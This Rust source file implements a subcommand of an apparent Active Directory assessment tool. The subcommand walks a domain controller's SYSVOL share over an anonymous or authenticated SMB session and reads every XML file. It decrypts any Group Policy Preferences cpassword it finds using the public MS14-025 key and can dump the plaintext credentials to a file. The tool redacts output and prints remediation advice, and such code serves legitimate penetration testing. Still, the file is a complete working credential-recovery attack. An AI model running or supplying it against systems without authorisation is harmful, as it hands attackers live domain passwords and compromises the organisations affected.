//! `enum sysvol --anon` — no-cred SYSVOL walk for GPP cpassword (MS14-025).
//!
//! WS-SYSVOL-ANON (1.5.0, G-9). Over one anonymous SMB session (`login_null`),
//! tree-connects `\\dc\SYSVOL` and walks it with SMB2 QUERY_DIRECTORY, reading
//! every Group Policy Preferences XML (`Groups.xml`, `Services.xml`,
//! `ScheduledTasks.xml`, `DataSources.xml`, `Printers.xml`, `Drives.xml`) and
//! any other `*.xml` under `Policies\`. Each is scanned for a `cpassword="…"`
//! attribute; a hit is decrypted with the public MS14-025 AES key
//! (`adhammer_sysvol::gpp`). Recovering a GPP cpassword this way is an instant
//! credential from *zero* credentials.
//!
//! On a DC that permits anonymous SYSVOL read this returns the accounts +
//! recoverable passwords; on a hardened DC the null session or the share read
//! is refused and that refusal is the finding. The decrypted plaintext is a
//! live credential and never touches stdout/JSON — it is written only to a
//! `--dump` secret artifact (0600, protected DACL); the summary shows the
//! account and a redacted marker.

use adhammer_core::sanitize_terminal_output as san;
use anyhow::Result;
use clap::Parser;

#[derive(Parser)]
pub(crate) struct SysvolArgs {
    /// Target DC / host (IP or name).
    #[arg(long)]
    pub host: String,
    /// Walk over an anonymous (null) session — no credentials used. Mutually
    /// exclusive with `--user`; one of the two is required.
    #[arg(long)]
    pub anon: bool,
    /// Authenticated walk as this user (any domain user can read SYSVOL — the
    /// real-world GPP attack). Alternative to `--anon`.
    #[arg(long)]
    pub user: Option<String>,
    /// Password for `--user` (secret ref: `env:VAR`, `@file:PATH`, or prompt).
    #[arg(long, default_value = "")]
    pub password: String,
    /// Domain / workgroup for `--user` (NetBIOS or FQDN).
    #[arg(long, default_value = "")]
    pub domain: String,
    /// Share to walk (default SYSVOL).
    #[arg(long, default_value = "SYSVOL")]
    pub share: String,
    /// Start the walk at this sub-path instead of the share root (e.g. the
    /// realm folder `corp.local`). Some servers reject an empty-name root open.
    #[arg(long, default_value = "")]
    pub start: String,
    /// Write recovered plaintext credentials to this secret artifact
    /// (created 0600 / protected DACL). Without it, passwords stay redacted.
    #[arg(long)]
    pub dump: Option<String>,
    /// Emit JSON instead of the human summary (never contains plaintext).
    #[arg(long)]
    pub json: bool,
}

/// A recovered GPP credential: which file, which account, and the decrypted
/// secret (held redacted; exposed only when writing the --dump artifact).
struct Recovered {
    file: String,
    account: String,
    secret: adhammer_core::SecretString,
}

#[derive(Default)]
struct SysvolReport {
    reachable: bool,
    null_session: bool,
    share_read: bool,
    xml_files: usize,
    recovered: Vec<Recovered>,
    notes: Vec<String>,
}

// Walk safety bounds — SYSVOL is small in practice; these stop a hostile or
// pathological tree from an unbounded walk.
const MAX_DIRS: usize = 20_000;
const MAX_DEPTH: usize = 16;
const MAX_XML_READ: usize = 5_000;

pub(crate) async fn sysvol(a: SysvolArgs) -> Result<()> {
    use smb2_client::SmbClient;

    if a.anon == a.user.is_some() {
        anyhow::bail!("pass exactly one of --anon (no-cred) or --user <name> (authenticated walk)");
    }

    let mode = if a.anon { "anonymous" } else { "authenticated" };
    let sp = crate::ui::Spinner::start(format!("{mode} SYSVOL walk → {}", a.host));
    let mut rep = SysvolReport::default();

    let mut smb = match SmbClient::connect(&a.host).await {
        Ok(s) => s,
        Err(e) => {
            sp.done_warn(&format!("SMB connect failed: {e}"));
            rep.notes.push(format!("connect: {e}"));
            return emit(&a, &rep);
        }
    };
    rep.reachable = true;

    let login = if a.anon {
        smb.login_null(&a.host).await
    } else {
        let pw = crate::resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
        smb.login(&a.host, &a.domain, a.user.as_deref().unwrap_or(""), &pw)
            .await
    };
    if let Err(e) = login {
        sp.done(&format!("{}: {mode} session refused", a.host));
        rep.notes.push(format!("{mode} session refused: {e}"));
        return emit(&a, &rep);
    }
    rep.null_session = true;

    if let Err(e) = smb
        .tree_connect(&format!("\\\\{}\\{}", a.host, a.share))
        .await
    {
        sp.done(&format!(
            "{}: {} tree-connect refused (hardened)",
            a.host, a.share
        ));
        rep.notes.push(format!("{} tree-connect: {e}", a.share));
        return emit(&a, &rep);
    }

    // Iterative walk with an explicit stack (avoids boxed async recursion).
    // Each item is (relative-path, depth). "" is the share root.
    let mut stack: Vec<(String, usize)> = vec![(a.start.clone(), 0)];
    let mut dirs_seen = 0usize;
    let mut xml_read = 0usize;
    let mut first_list_ok = false;

    while let Some((dir, depth)) = stack.pop() {
        if dirs_seen >= MAX_DIRS || depth > MAX_DEPTH {
            continue;
        }
        dirs_seen += 1;
        let entries = match smb.list_directory(&dir).await {
            Ok(e) => e,
            Err(e) => {
                // Seed dir failing = anon read refused; deeper failures are per-dir ACLs.
                if dir == a.start {
                    sp.done(&format!("{}: {} read refused (hardened)", a.host, a.share));
                    rep.notes.push(format!("list {}: {e}", a.share));
                    return emit(&a, &rep);
                }
                rep.notes.push(format!("list {}: {e}", san(&dir)));
                continue;
            }
        };
        first_list_ok = true;

        for ent in entries {
            let path = if dir.is_empty() {
                ent.name.clone()
            } else {
                format!("{dir}\\{}", ent.name)
            };
            if ent.is_dir {
                stack.push((path, depth + 1));
            } else if is_gpp_xml(&ent.name) && xml_read < MAX_XML_READ {
                xml_read += 1;
                rep.xml_files += 1;
                match smb.read_file(&path).await {
                    Ok(bytes) => scan_xml(&path, &bytes, &mut rep),
                    Err(e) => rep.notes.push(format!("read {}: {e}", san(&path))),
                }
            }
        }
    }
    rep.share_read = first_list_ok;

    let n = rep.recovered.len();
    if n > 0 {
        sp.done(&format!(
            "{}: {} GPP cpassword(s) recovered via {mode} walk [MS14-025]",
            a.host, n
        ));
    } else {
        sp.done(&format!(
            "{}: {} share read · {} GPP XML scanned · no cpassword",
            a.host, a.share, rep.xml_files
        ));
    }

    // The only place plaintext lands: the --dump secret artifact.
    if let Some(path) = &a.dump {
        if rep.recovered.is_empty() {
            crate::ui::warn("--dump: nothing recovered, no artifact written");
        } else {
            let mut body = format!(
                "# GPP cpassword recovery (MS14-025) — {} SYSVOL walk of {}\n",
                if a.anon { "anonymous" } else { "authenticated" },
                a.host
            );
            for r in &rep.recovered {
                body.push_str(&format!(
                    "{}\t{}\t{}\n",
                    r.file,
                    r.account,
                    r.secret.expose_secret()
                ));
            }
            adhammer_core::write_secret_artifact(
                std::path::Path::new(path),
                adhammer_core::SecretArtifact::GppDump,
                body.as_bytes(),
            )?;
            println!("[+] recovered credentials written → {path} (0600)");
        }
    }

    emit(&a, &rep)
}

/// GPP files that carry `cpassword`, plus any other `*.xml` (case-insensitive).
fn is_gpp_xml(name: &str) -> bool {
    name.to_ascii_lowercase().ends_with(".xml")
}

fn scan_xml(path: &str, bytes: &[u8], rep: &mut SysvolReport) {
    let xml = String::from_utf8_lossy(bytes);
    for (cpassword, account) in adhammer_sysvol::gpp::extract_cpasswords(&xml) {
        match adhammer_sysvol::gpp::decrypt_cpassword(&cpassword) {
            Ok(secret) => rep.recovered.push(Recovered {
                file: san(path),
                account: san(&account.unwrap_or_else(|| "(unknown)".into())),
                secret,
            }),
            Err(e) => rep.notes.push(format!("decrypt {}: {e}", san(path))),
        }
    }
}

fn emit(a: &SysvolArgs, r: &SysvolReport) -> Result<()> {
    if a.json {
        let recs = r
            .recovered
            .iter()
            .map(|rec| {
                // Plaintext deliberately omitted — only presence + locator.
                format!(
                    "{{\"file\":\"{}\",\"account\":\"{}\",\"recovered\":true}}",
                    jesc(&rec.file),
                    jesc(&rec.account)
                )
            })
            .collect::<Vec<_>>()
            .join(",");
        let notes = r
            .notes
            .iter()
            .map(|n| format!("\"{}\"", jesc(n)))
            .collect::<Vec<_>>()
            .join(",");
        println!(
            "{{\"host\":\"{}\",\"share\":\"{}\",\"anon\":{},\"reachable\":{},\"session\":{},\"share_read\":{},\"xml_scanned\":{},\"cpasswords\":[{}],\"notes\":[{}]}}",
            jesc(&a.host),
            jesc(&a.share),
            a.anon,
            r.reachable,
            r.null_session,
            r.share_read,
            r.xml_files,
            recs,
            notes
        );
        return Ok(());
    }

    let mode = if a.anon { "anonymous" } else { "authenticated" };
    println!(
        "\n== {} — {mode} SYSVOL ({}) ==",
        san(&a.host),
        san(&a.share)
    );
    if !r.reachable {
        println!("  SMB (445) not reachable");
    } else if !r.null_session {
        if a.anon {
            println!("  null session refused — DC hardened against anonymous SMB.");
        } else {
            println!("  authenticated session refused — bad credentials or SMB login blocked.");
        }
    } else if !r.share_read {
        if a.anon {
            println!(
                "  {} not readable anonymously — DC hardened (this is the secure posture).",
                san(&a.share)
            );
        } else {
            println!(
                "  {} not readable by this user (unexpected).",
                san(&a.share)
            );
        }
    } else if r.recovered.is_empty() {
        println!(
            "  {} readable ({mode}) · {} GPP XML scanned · no recoverable cpassword.",
            san(&a.share),
            r.xml_files
        );
    } else {
        let how = if a.anon {
            "ANONYMOUSLY — instant credentials from zero creds"
        } else {
            "by any authenticated user"
        };
        println!(
            "  {} GPP cpassword(s) recoverable {how} [MS14-025]:",
            r.recovered.len()
        );
        for rec in &r.recovered {
            println!(
                "    {}  account={}  password=[REDACTED]",
                rec.file, rec.account
            );
        }
        if a.dump.is_none() {
            println!(
                "  (pass --dump <path> to write the decrypted credentials to a 0600 artifact.)"
            );
        }
        println!(
            "  ** remediation: GPP passwords are decryptable by anyone (public MS key). Remove \
             cpassword from SYSVOL and rotate the affected accounts."
        );
    }
    if !r.notes.is_empty() {
        println!("  detail:");
        for n in r.notes.iter().take(20) {
            println!("    - {}", san(n));
        }
        if r.notes.len() > 20 {
            println!("    … {} more", r.notes.len() - 20);
        }
    }
    Ok(())
}

fn jesc(s: &str) -> String {
    let clean = adhammer_core::sanitize_terminal_output(s);
    let mut out = String::with_capacity(clean.len());
    for c in clean.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
            c => out.push(c),
        }
    }
    out
}
